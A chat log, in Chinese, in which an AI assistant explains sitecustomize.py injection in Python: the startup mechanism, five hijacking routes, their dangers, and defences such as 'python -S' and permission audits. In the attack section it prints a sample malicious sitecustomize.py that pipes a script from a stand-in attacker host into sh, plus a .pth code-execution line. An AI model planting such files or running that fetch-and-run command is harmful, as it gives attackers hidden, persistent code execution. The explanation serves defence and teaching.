# Sitecustomize.py注入攻击

### 🧑‍💻 User

什么是sitecustomize.py注入攻击？

---

### 🤖 Assistant

**`sitecustomize.py` 注入攻击**是一类利用 **Python 启动机制** 的代码执行攻击，攻击者通过在特定位置放置或篡改 `sitecustomize.py` 文件，使其在 **任意 Python 程序启动时被自动执行**，从而实现隐蔽、持久、低交互的任意代码执行（RCE）。

下面从 **机制 → 攻击方式 → 常见场景 → 危害 → 防御** 五个层面系统说明。

---

## 一、`sitecustomize.py` 是什么？

在 Python 启动流程中：

```text
python
 └─ import site
     ├─ 加载标准 site 配置
     ├─ 加载 .pth 文件
     ├─ 尝试 import sitecustomize
     └─ 尝试 import usercustomize
```

只要 **`sitecustomize.py` 存在于 `sys.path` 的任一目录中**，Python 就会在启动时 **自动执行它**，无需显式 `import`。

这是一个**官方设计的扩展点**，原本用于：

* 统一设置编码、路径
* 注入调试/监控逻辑
* 企业内 Python 环境定制

但也正因为 **“自动 + 无提示执行”**，它成为一个理想的攻击注入点。

---

## 二、什么是 `sitecustomize.py` 注入攻击？

**定义：**

> 攻击者通过控制 Python 的 `sys.path` 搜索路径，在其中放置恶意 `sitecustomize.py`，使得任何 Python 进程在启动时自动执行攻击代码。

这通常不依赖漏洞利用，而是：

* 路径污染（Path Hijacking）
* 环境配置错误
* 权限过宽
* 供应链/构建链攻击

---

## 三、典型攻击方式

### 1️⃣ 利用当前工作目录（CWD）

如果 Python 的 `sys.path` 包含 `""`（当前目录）：

```bash
.
├── sitecustomize.py   # 恶意
├── some_script.py
```

执行：

```bash
python some_script.py
```

**`sitecustomize.py` 会先于脚本执行。**

示例攻击代码：

```python
# sitecustomize.py
import os
os.system("curl http://attacker/payload.sh | sh")
```

适用于：

* CI/CD
* 解压即运行的工具
* 用户误入目录执行脚本

---

### 2️⃣ 注入到虚拟环境 / Conda 环境

位置示例：

```text
venv/lib/python3.11/site-packages/sitecustomize.py
```

一旦写入：

* 所有使用该 venv 的 Python 程序都会被感染
* 非常适合 **横向持久化**

---

### 3️⃣ 利用 `.pth` 文件加载恶意路径

`.pth` 文件可以包含：

```text
./malicious_path
```

或直接执行代码：

```python
import os; os.system("...")
```

攻击链：

```text
.pth → sys.path → sitecustomize.py → RCE
```

这是 **供应链攻击** 中非常常见的一环。

---

### 4️⃣ PYTHONPATH 环境变量注入

```bash
export PYTHONPATH=/tmp/evil
```

```text
/tmp/evil/sitecustomize.py
```

适用于：

* Web 服务启动脚本
* Docker ENTRYPOINT
* systemd service

---

### 5️⃣ 多用户系统中的权限滥用

如果：

```text
/usr/lib/python3.x/site-packages/
```

被错误设置为 **可写**，则：

* 低权限用户可植入 `sitecustomize.py`
* 高权限 Python 程序（如 root cron、系统服务）会被劫持

---

## 四、攻击的特点与危害

### ✅ 特点

| 特性   | 说明             |
| ---- | -------------- |
| 自动执行 | 无需 import      |
| 隐蔽   | 无日志、无异常        |
| 全局   | 影响所有 Python 程序 |
| 持久   | 一次写入，长期生效      |
| 横向   | 同环境内全感染        |

### ❌ 危害

* 任意代码执行（RCE）
* 数据窃取（环境变量、密钥、模型权重）
* 后门持久化
* CI/CD 构建污染
* ML/LLM 推理服务被劫持（非常现实）

在 **ML infra / 推理服务 / 离线评测框架** 中尤为危险，因为 Python 进程频繁、权限高。

---

## 五、与其他注入方式的区别

| 方式                 | 触发条件      | 显式导入 | 覆盖范围   |
| ------------------ | --------- | ---- | ------ |
| `sitecustomize.py` | Python 启动 | 否    | 全局     |
| `PYTHONSTARTUP`    | 交互式       | 否    | 仅 REPL |
| 模块劫持 (`os.py`)     | import    | 是    | 局部     |
| LD_PRELOAD         | 程序启动      | 否    | 所有进程   |

`sitecustomize.py` 的危险性在于 **“它不需要你犯错”**。

---

## 六、如何防御与审计？

### 🔒 1. 禁用 site 模块（高安全场景）

```bash
python -S your_app.py
```

这会跳过：

* site
* .pth
* sitecustomize
* usercustomize

---

### 🔒 2. 审计 `sys.path`

```python
import sys
print(sys.path)
```

重点检查：

* `""`
* `/tmp`
* 非预期路径

---

### 🔒 3. 检查是否存在 `sitecustomize`

```bash
python - << 'EOF'
import site, sys, pkgutil
print(pkgutil.find_loader("sitecustomize"))
EOF
```

---

### 🔒 4. 权限控制

* site-packages 必须 `root:root + 755`
* 禁止普通用户写入
* CI 容器使用只读层

---

### 🔒 5. 容器 / 推理服务最佳实践

* 使用 `python -S`
* 固定 `PYTHONPATH`
* 最小化 base image
* 定期扫描 `.pth` 文件

---

## 七、总结一句话

> **`sitecustomize.py` 注入攻击，本质上是对 Python 启动信任链的劫持，是一种“合法机制 + 非法用途”的高危后门技术。**

如果你关心的是：

* **LLM 推理服务安全**
* **模型评测环境完整性**
* **CI/CD 供应链攻击**

那么这是一个**必须重点防范**的攻击面。

如果你愿意，我可以进一步结合 **ML / 推理框架（vLLM、Torch、HF）** 或 **真实 CVE 案例** 来具体展开。
